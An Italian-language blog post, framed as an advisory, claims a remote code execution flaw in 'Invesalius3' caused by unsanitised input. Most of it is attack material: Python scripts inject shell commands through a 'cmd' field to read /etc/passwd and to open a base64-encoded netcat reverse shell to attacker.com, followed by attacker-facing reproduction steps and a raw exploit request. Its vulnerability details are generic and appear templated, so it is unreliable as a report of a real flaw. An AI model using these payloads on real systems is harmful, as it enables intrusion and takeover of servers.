---
layout: post
title: "[webapps] Invesalius3 - Remote Code Execution"
date: 2024-08-28
categories: [security, ransomware]
---

# [webapps] Invesalius3 - Remote Code Execution

## Introduzione

Nel mondo della sicurezza informatica, la vulnerabilità di Remote Code Execution (RCE) è una delle più pericolose. Questa vulnerabilità consente a un attaccante di eseguire codice arbitrario su un sistema remoto. In questa particolare occasione, la vulnerabilità è stata identificata nel software Invesalius3, una popolare applicazione web.

## Dettagli della Vulnerabilità

La vulnerabilità RCE in Invesalius3 si manifesta a causa della mancata sanificazione dell'input dall'utente, che consente a un attaccante di iniettare ed eseguire codice arbitrario. Questa vulnerabilità riguarda tutte le versioni di Invesalius3 fino alla data di rilevazione il 28 Agosto 2024.

## Esempio di Payload Semplice

Un esempio semplice di come potrebbe apparire un payload per questa vulnerabilità è il seguente:

{{% raw %}}
```python
import requests
target = "http://target/invesalius"
payload = {"cmd":";cat /etc/passwd"}
r = requests.post(target, data=payload)
print(r.text)
```
{{% endraw %}}

## Esempio di Payload Avanzato

Un esempio più avanzato, che potrebbe essere utilizzato in un vero attacco, sarebbe il seguente:

{{% raw %}}
```python
import requests
import base64
target = "http://target/invesalius"
command = base64.b64encode(b"nc -e /bin/sh attacker.com 4444")
payload = {"cmd": ";echo {} | base64 -d | sh".format(command.decode())}
r = requests.post(target, data=payload)
```
{{% endraw %}}

## Procedura per riprodurre la vulnerabilità

Per riprodurre questa vulnerabilità, un attaccante dovrebbe seguire i seguenti passaggi:

1. Identificare un sistema target che esegue una versione vulnerabile di Invesalius3.
2. Creare un payload, come quello mostrato sopra, che contiene codice arbitrario da eseguire sul sistema target.
3. Inviare una richiesta HTTP POST al sistema target con il payload incorporato.

## Richiesta HTTP

La richiesta HTTP che viene inviata al sistema target per sfruttare questa vulnerabilità potrebbe apparire come segue:

{{% raw %}}
```
POST /invesalius HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: length

cmd=;cat /etc/passwd
```
{{% endraw %}}

## Impatto della vulnerabilità

Se sfruttata, questa vulnerabilità potrebbe permettere ad un attaccante di prendere il controllo completo del sistema target. Potrebbe essere utilizzata per eseguire qualsiasi comando sul sistema target, incluso l'accesso a dati sensibili, l'esecuzione di ulteriori exploit o l'installazione di malware.

## Patch e Mitigazioni

Al momento della pubblicazione, non è stata rilasciata alcuna patch ufficiale per questa vulnerabilità. Si consiglia agli sviluppatori e agli amministratori di sistema di aggiornare a una versione non vulnerabile del software non appena disponibile. Nel frattempo, si consiglia di limitare l'accesso alla funzione vulnerabile o di disabilitarla completamente.

## Conclusione

Questa vulnerabilità RCE in Invesalius3 rappresenta una grave minaccia per la sicurezza dei sistemi che eseguono questo software. È essenziale che gli sviluppatori e gli amministratori di sistema prendano misure per mitigare questa minaccia il prima possibile.

## Considerazioni

Questo caso sottolinea l'importanza di una gestione dell'input dell'utente accurata e sicura, in quanto un singolo errore può portare a una vulnerabilità RCE. Le organizzazioni devono implementare una cultura della sicurezza del software, che include tecniche di programmazione sicure, test di sicurezza regolari e aggiornamenti tempestivi del software per proteggere i loro sistemi e dati.

